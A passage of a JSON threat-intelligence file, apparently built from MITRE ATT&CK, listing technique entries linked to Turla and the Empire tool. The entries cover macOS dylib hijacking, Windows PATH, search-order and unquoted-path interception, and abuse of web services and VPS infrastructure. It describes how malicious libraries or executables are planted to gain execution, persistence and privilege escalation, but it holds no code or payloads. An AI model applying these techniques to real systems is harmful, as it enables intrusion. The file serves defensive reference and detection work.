        "url": "https://github.com/EmpireProject/Empire/blob/master/lib/modules/python/situational_awareness/host/osx/HijackScanner.py",
        "description": "Wardle, P., Ross, C. (2017, September 21). Empire Project Dylib Hijack Vulnerability Scanner. Retrieved April 1, 2021.",
        "external_id": "none"
      },
      {
        "source_name": "Github EmpireProject CreateHijacker Dylib",
        "url": "https://github.com/EmpireProject/Empire/blob/08cbd274bef78243d7a8ed6443b8364acd1fc48b/lib/modules/python/persistence/osx/CreateHijacker.py",
        "description": "Wardle, P., Ross, C. (2018, April 8). EmpireProject Create Dylib Hijacker. Retrieved April 1, 2021.",
        "external_id": "none"
      },
      {
        "source_name": "capec",
        "url": "https://capec.mitre.org/data/definitions/471.html",
        "description": "none",
        "external_id": "CAPEC-471"
      }
    ],
    "technique_required_permissions": "none",
    "technique_effective_permissions": "none",
    "search_token": "none"
  },
  {
    "id": "attack-pattern--fc742192-19e3-466c-9eb5-964a97b29490",
    "platform": "macos",
    "tid": "T1574.004",
    "technique": "Dylib Hijacking",
    "tactic": "privilege-escalation",
    "datasources": "file-creation|file-modification|module-load",
    "has_subtechniques": false,
    "is_deprecated": false,
    "is_revoked": false,
    "subtechniques": [],
    "count_subtechniques": 0,
    "correlation_adversary": "turla",
    "correlation_malware": "none",
    "correlation_tool": "empire",
    "correlation_gid": "G0010",
    "technique_description": "Adversaries may execute their own payloads by placing a malicious dynamic library (dylib) with an expected name in a path a victim application searches at runtime. The dynamic loader will try to find the dylibs based on the sequential order of the search paths. Paths to dylibs may be prefixed with <code>@rpath</code>, which allows developers to use relative paths to specify an array of search paths used at runtime based on the location of the executable.  Additionally, if weak linking is used, such as the <code>LC_LOAD_WEAK_DYLIB</code> function, an application will still execute even if an expected dylib is not present. Weak linking enables developers to run an application on multiple macOS versions as new APIs are added.\n\nAdversaries may gain execution by inserting malicious dylibs with the name of the missing dylib in the identified path.(Citation: Wardle Dylib Hijack Vulnerable Apps)(Citation: Wardle Dylib Hijacking OSX 2015)(Citation: Github EmpireProject HijackScanner)(Citation: Github EmpireProject CreateHijacker Dylib) Dylibs are loaded into an application's address space allowing the malicious dylib to inherit the application's privilege level and resources. Based on the application, this could result in privilege escalation and uninhibited network access. This method may also evade detection from security products since the execution is masked under a legitimate process.(Citation: Writing Bad Malware for OSX)(Citation: wardle artofmalware volume1)(Citation: MalwareUnicorn macOS Dylib Injection MachO)",
    "technique_references": [
      {
        "source_name": "MalwareUnicorn macOS Dylib Injection MachO",
        "url": "https://malwareunicorn.org/workshops/macos_dylib_injection.html#5",
        "description": "Amanda Rousseau. (2020, April 4). MacOS Dylib Injection Workshop. Retrieved March 29, 2021.",
        "external_id": "none"
      },
      {
        "source_name": "Apple Developer Doco Archive Run-Path",
        "url": "https://developer.apple.com/library/archive/documentation/DeveloperTools/Conceptual/DynamicLibraries/100-Articles/RunpathDependentLibraries.html",
        "description": "Apple Inc.. (2012, July 7). Run-Path Dependent Libraries. Retrieved March 31, 2021.",
        "external_id": "none"
      },
      {
        "source_name": "Wardle Dylib Hijacking OSX 2015",
        "url": "https://www.virusbulletin.com/uploads/pdf/magazine/2015/vb201503-dylib-hijacking.pdf",
        "description": "Patrick Wardle. (2015, March 1). Dylib Hijacking on OS X. Retrieved March 29, 2021.",
        "external_id": "none"
      },
      {
        "source_name": "Writing Bad Malware for OSX",
        "url": "https://www.blackhat.com/docs/us-15/materials/us-15-Wardle-Writing-Bad-A-Malware-For-OS-X.pdf",
        "description": "Patrick Wardle. (2015). Writing Bad @$$ Malware for OS X. Retrieved July 10, 2017.",
        "external_id": "none"
      },
      {
        "source_name": "Wardle Dylib Hijack Vulnerable Apps",
        "url": "https://objective-see.com/blog/blog_0x46.html",
        "description": "Patrick Wardle. (2019, July 2). Getting Root with Benign AppStore Apps. Retrieved March 31, 2021.",
        "external_id": "none"
      },
      {
        "source_name": "wardle artofmalware volume1",
        "url": "https://taomm.org/vol1/pdfs.html",
        "description": "Patrick Wardle. (2020, August 5). The Art of Mac Malware Volume 0x1: Analysis. Retrieved March 19, 2021.",
        "external_id": "none"
      },
      {
        "source_name": "Github EmpireProject HijackScanner",
        "url": "https://github.com/EmpireProject/Empire/blob/master/lib/modules/python/situational_awareness/host/osx/HijackScanner.py",
        "description": "Wardle, P., Ross, C. (2017, September 21). Empire Project Dylib Hijack Vulnerability Scanner. Retrieved April 1, 2021.",
        "external_id": "none"
      },
      {
        "source_name": "Github EmpireProject CreateHijacker Dylib",
        "url": "https://github.com/EmpireProject/Empire/blob/08cbd274bef78243d7a8ed6443b8364acd1fc48b/lib/modules/python/persistence/osx/CreateHijacker.py",
        "description": "Wardle, P., Ross, C. (2018, April 8). EmpireProject Create Dylib Hijacker. Retrieved April 1, 2021.",
        "external_id": "none"
      },
      {
        "source_name": "capec",
        "url": "https://capec.mitre.org/data/definitions/471.html",
        "description": "none",
        "external_id": "CAPEC-471"
      }
    ],
    "technique_required_permissions": "none",
    "technique_effective_permissions": "none",
    "search_token": "none"
  },
  {
    "id": "attack-pattern--0c2d00da-7742-49e7-9928-4514e5075d32",
    "platform": "windows",
    "tid": "T1574.007",
    "technique": "Path Interception by PATH Environment Variable",
    "tactic": "defense-evasion",
    "datasources": "file-creation|file-modification|process-creation|windows-registry-key-modification",
    "has_subtechniques": false,
    "is_deprecated": false,
    "is_revoked": false,
    "subtechniques": [],
    "count_subtechniques": 0,
    "correlation_adversary": "turla",
    "correlation_malware": "none",
    "correlation_tool": "empire",
    "correlation_gid": "G0010",
    "technique_description": "Adversaries may execute their own malicious payloads by hijacking environment variables used to load libraries. Adversaries may place a program in an earlier entry in the list of directories stored in the PATH environment variable, which Windows will then execute when it searches sequentially through that PATH listing in search of the binary that was called from a script or the command line.\n\nThe PATH environment variable contains a list of directories. Certain methods of executing a program (namely using cmd.exe or the command-line) rely solely on the PATH environment variable to determine the locations that are searched for a program when the path for the program is not given. If any directories are listed in the PATH environment variable before the Windows directory, <code>%SystemRoot%\\system32</code> (e.g., <code>C:\\Windows\\system32</code>), a program may be placed in the preceding directory that is named the same as a Windows program (such as cmd, PowerShell, or Python), which will be executed when that command is executed from a script or command-line.\n\nFor example, if <code>C:\\example path</code> precedes </code>C:\\Windows\\system32</code> is in the PATH environment variable, a program that is named net.exe and placed in <code>C:\\example path</code> will be called instead of the Windows system \"net\" when \"net\" is executed from the command-line.",
    "technique_references": [
      {
        "source_name": "capec",
        "url": "https://capec.mitre.org/data/definitions/13.html",
        "description": "none",
        "external_id": "CAPEC-13"
      },
      {
        "source_name": "capec",
        "url": "https://capec.mitre.org/data/definitions/38.html",
        "description": "none",
        "external_id": "CAPEC-38"
      }
    ],
    "technique_required_permissions": "none",
    "technique_effective_permissions": "none",
    "search_token": "none"
  },
  {
    "id": "attack-pattern--0c2d00da-7742-49e7-9928-4514e5075d32",
    "platform": "windows",
    "tid": "T1574.007",
    "technique": "Path Interception by PATH Environment Variable",
    "tactic": "persistence",
    "datasources": "file-creation|file-modification|process-creation|windows-registry-key-modification",
    "has_subtechniques": false,
    "is_deprecated": false,
    "is_revoked": false,
    "subtechniques": [],
    "count_subtechniques": 0,
    "correlation_adversary": "turla",
    "correlation_malware": "none",
    "correlation_tool": "empire",
    "correlation_gid": "G0010",
    "technique_description": "Adversaries may execute their own malicious payloads by hijacking environment variables used to load libraries. Adversaries may place a program in an earlier entry in the list of directories stored in the PATH environment variable, which Windows will then execute when it searches sequentially through that PATH listing in search of the binary that was called from a script or the command line.\n\nThe PATH environment variable contains a list of directories. Certain methods of executing a program (namely using cmd.exe or the command-line) rely solely on the PATH environment variable to determine the locations that are searched for a program when the path for the program is not given. If any directories are listed in the PATH environment variable before the Windows directory, <code>%SystemRoot%\\system32</code> (e.g., <code>C:\\Windows\\system32</code>), a program may be placed in the preceding directory that is named the same as a Windows program (such as cmd, PowerShell, or Python), which will be executed when that command is executed from a script or command-line.\n\nFor example, if <code>C:\\example path</code> precedes </code>C:\\Windows\\system32</code> is in the PATH environment variable, a program that is named net.exe and placed in <code>C:\\example path</code> will be called instead of the Windows system \"net\" when \"net\" is executed from the command-line.",
    "technique_references": [
      {
        "source_name": "capec",
        "url": "https://capec.mitre.org/data/definitions/13.html",
        "description": "none",
        "external_id": "CAPEC-13"
      },
      {
        "source_name": "capec",
        "url": "https://capec.mitre.org/data/definitions/38.html",
        "description": "none",
        "external_id": "CAPEC-38"
      }
    ],
    "technique_required_permissions": "none",
    "technique_effective_permissions": "none",
    "search_token": "none"
  },
  {
    "id": "attack-pattern--0c2d00da-7742-49e7-9928-4514e5075d32",
    "platform": "windows",
    "tid": "T1574.007",
    "technique": "Path Interception by PATH Environment Variable",
    "tactic": "privilege-escalation",
    "datasources": "file-creation|file-modification|process-creation|windows-registry-key-modification",
    "has_subtechniques": false,
    "is_deprecated": false,
    "is_revoked": false,
    "subtechniques": [],
    "count_subtechniques": 0,
    "correlation_adversary": "turla",
    "correlation_malware": "none",
    "correlation_tool": "empire",
    "correlation_gid": "G0010",
    "technique_description": "Adversaries may execute their own malicious payloads by hijacking environment variables used to load libraries. Adversaries may place a program in an earlier entry in the list of directories stored in the PATH environment variable, which Windows will then execute when it searches sequentially through that PATH listing in search of the binary that was called from a script or the command line.\n\nThe PATH environment variable contains a list of directories. Certain methods of executing a program (namely using cmd.exe or the command-line) rely solely on the PATH environment variable to determine the locations that are searched for a program when the path for the program is not given. If any directories are listed in the PATH environment variable before the Windows directory, <code>%SystemRoot%\\system32</code> (e.g., <code>C:\\Windows\\system32</code>), a program may be placed in the preceding directory that is named the same as a Windows program (such as cmd, PowerShell, or Python), which will be executed when that command is executed from a script or command-line.\n\nFor example, if <code>C:\\example path</code> precedes </code>C:\\Windows\\system32</code> is in the PATH environment variable, a program that is named net.exe and placed in <code>C:\\example path</code> will be called instead of the Windows system \"net\" when \"net\" is executed from the command-line.",
    "technique_references": [
      {
        "source_name": "capec",
        "url": "https://capec.mitre.org/data/definitions/13.html",
        "description": "none",
        "external_id": "CAPEC-13"
      },
      {
        "source_name": "capec",
        "url": "https://capec.mitre.org/data/definitions/38.html",
        "description": "none",
        "external_id": "CAPEC-38"
      }
    ],
    "technique_required_permissions": "none",
    "technique_effective_permissions": "none",
    "search_token": "none"
  },
  {
    "id": "attack-pattern--58af3705-8740-4c68-9329-ec015a7013c2",
    "platform": "windows",
    "tid": "T1574.008",
    "technique": "Path Interception by Search Order Hijacking",
    "tactic": "defense-evasion",
    "datasources": "file-creation|file-modification|process-creation",
    "has_subtechniques": false,
    "is_deprecated": false,
    "is_revoked": false,
    "subtechniques": [],
    "count_subtechniques": 0,
    "correlation_adversary": "turla",
    "correlation_malware": "none",
    "correlation_tool": "empire",
    "correlation_gid": "G0010",
    "technique_description": "Adversaries may execute their own malicious payloads by hijacking the search order used to load other programs. Because some programs do not call other programs using the full path, adversaries may place their own file in the directory where the calling program is located, causing the operating system to launch their malicious software at the request of the calling program.\n\nSearch order hijacking occurs when an adversary abuses the order in which Windows searches for programs that are not given a path. Unlike [DLL Search Order Hijacking](https://attack.mitre.org/techniques/T1574/001), the search order differs depending on the method that is used to execute the program. (Citation: Microsoft CreateProcess) (Citation: Windows NT Command Shell) (Citation: Microsoft WinExec) However, it is common for Windows to search in the directory of the initiating program before searching through the Windows system directory. An adversary who finds a program vulnerable to search order hijacking (i.e., a program that does not specify the path to an executable) may take advantage of this vulnerability by creating a program named after the improperly specified program and placing it within the initiating program's directory.\n\nFor example, \"example.exe\" runs \"cmd.exe\" with the command-line argument <code>net user</code>. An adversary may place a program called \"net.exe\" within the same directory as example.exe, \"net.exe\" will be run instead of the Windows system utility net. In addition, if an adversary places a program called \"net.com\" in the same directory as \"net.exe\", then <code>cmd.exe /C net user</code> will execute \"net.com\" instead of \"net.exe\" due to the order of executable extensions defined under PATHEXT. (Citation: Microsoft Environment Property)\n\nSearch order hijacking is also a common practice for hijacking DLL loads and is covered in [DLL Search Order Hijacking](https://attack.mitre.org/techniques/T1574/001).",
    "technique_references": [
      {
        "source_name": "capec",
        "url": "https://capec.mitre.org/data/definitions/159.html",
        "description": "none",
        "external_id": "CAPEC-159"
      },
      {
        "source_name": "Microsoft CreateProcess",
        "url": "http://msdn.microsoft.com/en-us/library/ms682425",
        "description": "Microsoft. (n.d.). CreateProcess function. Retrieved December 5, 2014.",
        "external_id": "none"
      },
      {
        "source_name": "Windows NT Command Shell",
        "url": "https://docs.microsoft.com/en-us/previous-versions//cc723564(v=technet.10)?redirectedfrom=MSDN#XSLTsection127121120120",
        "description": "Tim Hill. (2014, February 2). The Windows NT Command Shell. Retrieved December 5, 2014.",
        "external_id": "none"
      },
      {
        "source_name": "Microsoft WinExec",
        "url": "http://msdn.microsoft.com/en-us/library/ms687393",
        "description": "Microsoft. (n.d.). WinExec function. Retrieved December 5, 2014.",
        "external_id": "none"
      },
      {
        "source_name": "Microsoft Environment Property",
        "url": "https://docs.microsoft.com/en-us/previous-versions//fd7hxfdd(v=vs.85)?redirectedfrom=MSDN",
        "description": "Microsoft. (2011, October 24). Environment Property. Retrieved July 27, 2016.",
        "external_id": "none"
      }
    ],
    "technique_required_permissions": "administrator|user|system",
    "technique_effective_permissions": "administrator|system|user",
    "search_token": "none"
  },
  {
    "id": "attack-pattern--58af3705-8740-4c68-9329-ec015a7013c2",
    "platform": "windows",
    "tid": "T1574.008",
    "technique": "Path Interception by Search Order Hijacking",
    "tactic": "persistence",
    "datasources": "file-creation|file-modification|process-creation",
    "has_subtechniques": false,
    "is_deprecated": false,
    "is_revoked": false,
    "subtechniques": [],
    "count_subtechniques": 0,
    "correlation_adversary": "turla",
    "correlation_malware": "none",
    "correlation_tool": "empire",
    "correlation_gid": "G0010",
    "technique_description": "Adversaries may execute their own malicious payloads by hijacking the search order used to load other programs. Because some programs do not call other programs using the full path, adversaries may place their own file in the directory where the calling program is located, causing the operating system to launch their malicious software at the request of the calling program.\n\nSearch order hijacking occurs when an adversary abuses the order in which Windows searches for programs that are not given a path. Unlike [DLL Search Order Hijacking](https://attack.mitre.org/techniques/T1574/001), the search order differs depending on the method that is used to execute the program. (Citation: Microsoft CreateProcess) (Citation: Windows NT Command Shell) (Citation: Microsoft WinExec) However, it is common for Windows to search in the directory of the initiating program before searching through the Windows system directory. An adversary who finds a program vulnerable to search order hijacking (i.e., a program that does not specify the path to an executable) may take advantage of this vulnerability by creating a program named after the improperly specified program and placing it within the initiating program's directory.\n\nFor example, \"example.exe\" runs \"cmd.exe\" with the command-line argument <code>net user</code>. An adversary may place a program called \"net.exe\" within the same directory as example.exe, \"net.exe\" will be run instead of the Windows system utility net. In addition, if an adversary places a program called \"net.com\" in the same directory as \"net.exe\", then <code>cmd.exe /C net user</code> will execute \"net.com\" instead of \"net.exe\" due to the order of executable extensions defined under PATHEXT. (Citation: Microsoft Environment Property)\n\nSearch order hijacking is also a common practice for hijacking DLL loads and is covered in [DLL Search Order Hijacking](https://attack.mitre.org/techniques/T1574/001).",
    "technique_references": [
      {
        "source_name": "capec",
        "url": "https://capec.mitre.org/data/definitions/159.html",
        "description": "none",
        "external_id": "CAPEC-159"
      },
      {
        "source_name": "Microsoft CreateProcess",
        "url": "http://msdn.microsoft.com/en-us/library/ms682425",
        "description": "Microsoft. (n.d.). CreateProcess function. Retrieved December 5, 2014.",
        "external_id": "none"
      },
      {
        "source_name": "Windows NT Command Shell",
        "url": "https://docs.microsoft.com/en-us/previous-versions//cc723564(v=technet.10)?redirectedfrom=MSDN#XSLTsection127121120120",
        "description": "Tim Hill. (2014, February 2). The Windows NT Command Shell. Retrieved December 5, 2014.",
        "external_id": "none"
      },
      {
        "source_name": "Microsoft WinExec",
        "url": "http://msdn.microsoft.com/en-us/library/ms687393",
        "description": "Microsoft. (n.d.). WinExec function. Retrieved December 5, 2014.",
        "external_id": "none"
      },
      {
        "source_name": "Microsoft Environment Property",
        "url": "https://docs.microsoft.com/en-us/previous-versions//fd7hxfdd(v=vs.85)?redirectedfrom=MSDN",
        "description": "Microsoft. (2011, October 24). Environment Property. Retrieved July 27, 2016.",
        "external_id": "none"
      }
    ],
    "technique_required_permissions": "administrator|user|system",
    "technique_effective_permissions": "administrator|system|user",
    "search_token": "none"
  },
  {
    "id": "attack-pattern--58af3705-8740-4c68-9329-ec015a7013c2",
    "platform": "windows",
    "tid": "T1574.008",
    "technique": "Path Interception by Search Order Hijacking",
    "tactic": "privilege-escalation",
    "datasources": "file-creation|file-modification|process-creation",
    "has_subtechniques": false,
    "is_deprecated": false,
    "is_revoked": false,
    "subtechniques": [],
    "count_subtechniques": 0,
    "correlation_adversary": "turla",
    "correlation_malware": "none",
    "correlation_tool": "empire",
    "correlation_gid": "G0010",
    "technique_description": "Adversaries may execute their own malicious payloads by hijacking the search order used to load other programs. Because some programs do not call other programs using the full path, adversaries may place their own file in the directory where the calling program is located, causing the operating system to launch their malicious software at the request of the calling program.\n\nSearch order hijacking occurs when an adversary abuses the order in which Windows searches for programs that are not given a path. Unlike [DLL Search Order Hijacking](https://attack.mitre.org/techniques/T1574/001), the search order differs depending on the method that is used to execute the program. (Citation: Microsoft CreateProcess) (Citation: Windows NT Command Shell) (Citation: Microsoft WinExec) However, it is common for Windows to search in the directory of the initiating program before searching through the Windows system directory. An adversary who finds a program vulnerable to search order hijacking (i.e., a program that does not specify the path to an executable) may take advantage of this vulnerability by creating a program named after the improperly specified program and placing it within the initiating program's directory.\n\nFor example, \"example.exe\" runs \"cmd.exe\" with the command-line argument <code>net user</code>. An adversary may place a program called \"net.exe\" within the same directory as example.exe, \"net.exe\" will be run instead of the Windows system utility net. In addition, if an adversary places a program called \"net.com\" in the same directory as \"net.exe\", then <code>cmd.exe /C net user</code> will execute \"net.com\" instead of \"net.exe\" due to the order of executable extensions defined under PATHEXT. (Citation: Microsoft Environment Property)\n\nSearch order hijacking is also a common practice for hijacking DLL loads and is covered in [DLL Search Order Hijacking](https://attack.mitre.org/techniques/T1574/001).",
    "technique_references": [
      {
        "source_name": "capec",
        "url": "https://capec.mitre.org/data/definitions/159.html",
        "description": "none",
        "external_id": "CAPEC-159"
      },
      {
        "source_name": "Microsoft CreateProcess",
        "url": "http://msdn.microsoft.com/en-us/library/ms682425",
        "description": "Microsoft. (n.d.). CreateProcess function. Retrieved December 5, 2014.",
        "external_id": "none"
      },
      {
        "source_name": "Windows NT Command Shell",
        "url": "https://docs.microsoft.com/en-us/previous-versions//cc723564(v=technet.10)?redirectedfrom=MSDN#XSLTsection127121120120",
        "description": "Tim Hill. (2014, February 2). The Windows NT Command Shell. Retrieved December 5, 2014.",
        "external_id": "none"
      },
      {
        "source_name": "Microsoft WinExec",
        "url": "http://msdn.microsoft.com/en-us/library/ms687393",
        "description": "Microsoft. (n.d.). WinExec function. Retrieved December 5, 2014.",
        "external_id": "none"
      },
      {
        "source_name": "Microsoft Environment Property",
        "url": "https://docs.microsoft.com/en-us/previous-versions//fd7hxfdd(v=vs.85)?redirectedfrom=MSDN",
        "description": "Microsoft. (2011, October 24). Environment Property. Retrieved July 27, 2016.",
        "external_id": "none"
      }
    ],
    "technique_required_permissions": "administrator|user|system",
    "technique_effective_permissions": "administrator|system|user",
    "search_token": "none"
  },
  {
    "id": "attack-pattern--bf96a5a3-3bce-43b7-8597-88545984c07b",
    "platform": "windows",
    "tid": "T1574.009",
    "technique": "Path Interception by Unquoted Path",
    "tactic": "defense-evasion",
    "datasources": "file-creation|file-modification|process-creation",
    "has_subtechniques": false,
    "is_deprecated": false,
    "is_revoked": false,
    "subtechniques": [],
    "count_subtechniques": 0,
    "correlation_adversary": "turla",
    "correlation_malware": "none",
    "correlation_tool": "empire",
    "correlation_gid": "G0010",
    "technique_description": "Adversaries may execute their own malicious payloads by hijacking vulnerable file path references. Adversaries can take advantage of paths that lack surrounding quotations by placing an executable in a higher level directory within the path, so that Windows will choose the adversary's executable to launch.\n\nService paths (Citation: Microsoft CurrentControlSet Services) and shortcut paths may also be vulnerable to path interception if the path has one or more spaces and is not surrounded by quotation marks (e.g., <code>C:\\unsafe path with space\\program.exe</code> vs. <code>\"C:\\safe path with space\\program.exe\"</code>). (Citation: Help eliminate unquoted path) (stored in Windows Registry keys) An adversary can place an executable in a higher level directory of the path, and Windows will resolve that executable instead of the intended executable. For example, if the path in a shortcut is <code>C:\\program files\\myapp.exe</code>, an adversary may create a program at <code>C:\\program.exe</code> that will be run instead of the intended program. (Citation: Windows Unquoted Services) (Citation: Windows Privilege Escalation Guide)\n\nThis technique can be used for persistence if executables are called on a regular basis, as well as privilege escalation if intercepted executables are started by a higher privileged process.",
    "technique_references": [
      {
        "source_name": "capec",
        "url": "https://capec.mitre.org/data/definitions/38.html",
        "description": "none",
        "external_id": "CAPEC-38"
      },
      {
        "source_name": "Microsoft CurrentControlSet Services",
        "url": "https://docs.microsoft.com/en-us/windows-hardware/drivers/install/hklm-system-currentcontrolset-services-registry-tree",
        "description": "Microsoft. (2017, April 20). HKLM\\SYSTEM\\CurrentControlSet\\Services Registry Tree. Retrieved March 16, 2020.",
        "external_id": "none"
      },
      {
        "source_name": "Help eliminate unquoted path",
        "url": "https://isc.sans.edu/diary/Help+eliminate+unquoted+path+vulnerabilities/14464",
        "description": "Mark Baggett. (2012, November 8). Help eliminate unquoted path vulnerabilities. Retrieved November 8, 2012.",
        "external_id": "none"
      },
      {
        "source_name": "Windows Unquoted Services",
        "url": "https://securityboulevard.com/2018/04/windows-privilege-escalation-unquoted-services/",
        "description": "HackHappy. (2018, April 23). Windows Privilege Escalation – Unquoted Services. Retrieved August 10, 2018.",
        "external_id": "none"
      },
      {
        "source_name": "Windows Privilege Escalation Guide",
        "url": "https://www.absolomb.com/2018-01-26-Windows-Privilege-Escalation-Guide/",
        "description": "absolomb. (2018, January 26). Windows Privilege Escalation Guide. Retrieved August 10, 2018.",
        "external_id": "none"
      }
    ],
    "technique_required_permissions": "none",
    "technique_effective_permissions": "none",
    "search_token": "none"
  },
  {
    "id": "attack-pattern--bf96a5a3-3bce-43b7-8597-88545984c07b",
    "platform": "windows",
    "tid": "T1574.009",
    "technique": "Path Interception by Unquoted Path",
    "tactic": "persistence",
    "datasources": "file-creation|file-modification|process-creation",
    "has_subtechniques": false,
    "is_deprecated": false,
    "is_revoked": false,
    "subtechniques": [],
    "count_subtechniques": 0,
    "correlation_adversary": "turla",
    "correlation_malware": "none",
    "correlation_tool": "empire",
    "correlation_gid": "G0010",
    "technique_description": "Adversaries may execute their own malicious payloads by hijacking vulnerable file path references. Adversaries can take advantage of paths that lack surrounding quotations by placing an executable in a higher level directory within the path, so that Windows will choose the adversary's executable to launch.\n\nService paths (Citation: Microsoft CurrentControlSet Services) and shortcut paths may also be vulnerable to path interception if the path has one or more spaces and is not surrounded by quotation marks (e.g., <code>C:\\unsafe path with space\\program.exe</code> vs. <code>\"C:\\safe path with space\\program.exe\"</code>). (Citation: Help eliminate unquoted path) (stored in Windows Registry keys) An adversary can place an executable in a higher level directory of the path, and Windows will resolve that executable instead of the intended executable. For example, if the path in a shortcut is <code>C:\\program files\\myapp.exe</code>, an adversary may create a program at <code>C:\\program.exe</code> that will be run instead of the intended program. (Citation: Windows Unquoted Services) (Citation: Windows Privilege Escalation Guide)\n\nThis technique can be used for persistence if executables are called on a regular basis, as well as privilege escalation if intercepted executables are started by a higher privileged process.",
    "technique_references": [
      {
        "source_name": "capec",
        "url": "https://capec.mitre.org/data/definitions/38.html",
        "description": "none",
        "external_id": "CAPEC-38"
      },
      {
        "source_name": "Microsoft CurrentControlSet Services",
        "url": "https://docs.microsoft.com/en-us/windows-hardware/drivers/install/hklm-system-currentcontrolset-services-registry-tree",
        "description": "Microsoft. (2017, April 20). HKLM\\SYSTEM\\CurrentControlSet\\Services Registry Tree. Retrieved March 16, 2020.",
        "external_id": "none"
      },
      {
        "source_name": "Help eliminate unquoted path",
        "url": "https://isc.sans.edu/diary/Help+eliminate+unquoted+path+vulnerabilities/14464",
        "description": "Mark Baggett. (2012, November 8). Help eliminate unquoted path vulnerabilities. Retrieved November 8, 2012.",
        "external_id": "none"
      },
      {
        "source_name": "Windows Unquoted Services",
        "url": "https://securityboulevard.com/2018/04/windows-privilege-escalation-unquoted-services/",
        "description": "HackHappy. (2018, April 23). Windows Privilege Escalation – Unquoted Services. Retrieved August 10, 2018.",
        "external_id": "none"
      },
      {
        "source_name": "Windows Privilege Escalation Guide",
        "url": "https://www.absolomb.com/2018-01-26-Windows-Privilege-Escalation-Guide/",
        "description": "absolomb. (2018, January 26). Windows Privilege Escalation Guide. Retrieved August 10, 2018.",
        "external_id": "none"
      }
    ],
    "technique_required_permissions": "none",
    "technique_effective_permissions": "none",
    "search_token": "none"
  },
  {
    "id": "attack-pattern--bf96a5a3-3bce-43b7-8597-88545984c07b",
    "platform": "windows",
    "tid": "T1574.009",
    "technique": "Path Interception by Unquoted Path",
    "tactic": "privilege-escalation",
    "datasources": "file-creation|file-modification|process-creation",
    "has_subtechniques": false,
    "is_deprecated": false,
    "is_revoked": false,
    "subtechniques": [],
    "count_subtechniques": 0,
    "correlation_adversary": "turla",
    "correlation_malware": "none",
    "correlation_tool": "empire",
    "correlation_gid": "G0010",
    "technique_description": "Adversaries may execute their own malicious payloads by hijacking vulnerable file path references. Adversaries can take advantage of paths that lack surrounding quotations by placing an executable in a higher level directory within the path, so that Windows will choose the adversary's executable to launch.\n\nService paths (Citation: Microsoft CurrentControlSet Services) and shortcut paths may also be vulnerable to path interception if the path has one or more spaces and is not surrounded by quotation marks (e.g., <code>C:\\unsafe path with space\\program.exe</code> vs. <code>\"C:\\safe path with space\\program.exe\"</code>). (Citation: Help eliminate unquoted path) (stored in Windows Registry keys) An adversary can place an executable in a higher level directory of the path, and Windows will resolve that executable instead of the intended executable. For example, if the path in a shortcut is <code>C:\\program files\\myapp.exe</code>, an adversary may create a program at <code>C:\\program.exe</code> that will be run instead of the intended program. (Citation: Windows Unquoted Services) (Citation: Windows Privilege Escalation Guide)\n\nThis technique can be used for persistence if executables are called on a regular basis, as well as privilege escalation if intercepted executables are started by a higher privileged process.",
    "technique_references": [
      {
        "source_name": "capec",
        "url": "https://capec.mitre.org/data/definitions/38.html",
        "description": "none",
        "external_id": "CAPEC-38"
      },
      {
        "source_name": "Microsoft CurrentControlSet Services",
        "url": "https://docs.microsoft.com/en-us/windows-hardware/drivers/install/hklm-system-currentcontrolset-services-registry-tree",
        "description": "Microsoft. (2017, April 20). HKLM\\SYSTEM\\CurrentControlSet\\Services Registry Tree. Retrieved March 16, 2020.",
        "external_id": "none"
      },
      {
        "source_name": "Help eliminate unquoted path",
        "url": "https://isc.sans.edu/diary/Help+eliminate+unquoted+path+vulnerabilities/14464",
        "description": "Mark Baggett. (2012, November 8). Help eliminate unquoted path vulnerabilities. Retrieved November 8, 2012.",
        "external_id": "none"
      },
      {
        "source_name": "Windows Unquoted Services",
        "url": "https://securityboulevard.com/2018/04/windows-privilege-escalation-unquoted-services/",
        "description": "HackHappy. (2018, April 23). Windows Privilege Escalation – Unquoted Services. Retrieved August 10, 2018.",
        "external_id": "none"
      },
      {
        "source_name": "Windows Privilege Escalation Guide",
        "url": "https://www.absolomb.com/2018-01-26-Windows-Privilege-Escalation-Guide/",
        "description": "absolomb. (2018, January 26). Windows Privilege Escalation Guide. Retrieved August 10, 2018.",
        "external_id": "none"
      }
    ],
    "technique_required_permissions": "none",
    "technique_effective_permissions": "none",
    "search_token": "none"
  },
  {
    "id": "attack-pattern--88d31120-5bc7-4ce3-a9c0-7cf147be8e54",
    "platform": "pre",
    "tid": "T1583.006",
    "technique": "Web Services",
    "tactic": "resource-development",
    "datasources": "response-content",
    "has_subtechniques": false,
    "is_deprecated": false,
    "is_revoked": false,
    "subtechniques": [],
    "count_subtechniques": 0,
    "correlation_adversary": "turla",
    "correlation_malware": "none",
    "correlation_tool": "none",
    "correlation_gid": "G0010",
    "technique_description": "Adversaries may register for web services that can be used during targeting. A variety of popular websites exist for adversaries to register for a web-based service that can be abused during later stages of the adversary lifecycle, such as during Command and Control ([Web Service](https://attack.mitre.org/techniques/T1102)) or [Exfiltration Over Web Service](https://attack.mitre.org/techniques/T1567). Using common services, such as those offered by Google or Twitter, makes it easier for adversaries to hide in expected noise. By utilizing a web service, adversaries can make it difficult to physically tie back operations to them.",
    "technique_references": [
      {
        "source_name": "ThreatConnect Infrastructure Dec 2020",
        "url": "https://threatconnect.com/blog/infrastructure-research-hunting/",
        "description": "ThreatConnect. (2020, December 15). Infrastructure Research and Hunting: Boiling the Domain Ocean. Retrieved October 12, 2021.",
        "external_id": "none"
      }
    ],
    "technique_required_permissions": "none",
    "technique_effective_permissions": "none",
    "search_token": "none"
  },
  {
    "id": "attack-pattern--39cc9f64-cf74-4a48-a4d8-fe98c54a02e0",
    "platform": "pre",
    "tid": "T1584.003",
    "technique": "Virtual Private Server",
    "tactic": "resource-development",
    "datasources": "response-content|response-metadata",
    "has_subtechniques": false,
    "is_deprecated": false,
    "is_revoked": false,
    "subtechniques": [],
    "count_subtechniques": 0,
    "correlation_adversary": "turla",
    "correlation_malware": "none",
    "correlation_tool": "none",
    "correlation_gid": "G0010",
    "technique_description": "Adversaries may compromise third-party Virtual Private Servers (VPSs) that can be used during targeting. There exist a variety of cloud service providers that will sell virtual machines/containers as a service. Adversaries may compromise VPSs purchased by third-party entities. By compromising a VPS to use as infrastructure, adversaries can make it difficult to physically tie back operations to themselves.(Citation: NSA NCSC Turla OilRig)\n\nCompromising a VPS for use in later stages of the adversary lifecycle, such as Command and Control, can allow adversaries to benefit from the ubiquity and trust associated with higher reputation cloud service providers as well as that added by the compromised third-party.",
    "technique_references": [
      {
        "source_name": "NSA NCSC Turla OilRig",
